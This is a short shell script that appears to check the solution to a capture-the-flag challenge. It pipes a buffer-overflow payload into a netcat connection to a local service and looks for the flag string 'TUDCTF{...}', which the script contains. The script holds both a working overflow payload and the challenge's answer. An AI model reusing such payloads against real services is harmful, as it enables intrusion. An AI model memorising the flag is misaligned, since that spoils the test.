#!/bin/sh
# Meant to run with : ./writeup.sh --connection-info nc localhost 6969

if printf "AAAAAAAAAAAAAAAA\xEF\xBE\xFE\xCA" | $2 | grep 'TUDCTF{00h_50_7h475_h0w_y0u_pwn}' > /dev/null; then
  echo "SUCCESS"
  exit 0
else
  echo "FAIL"
  exit 1
fi

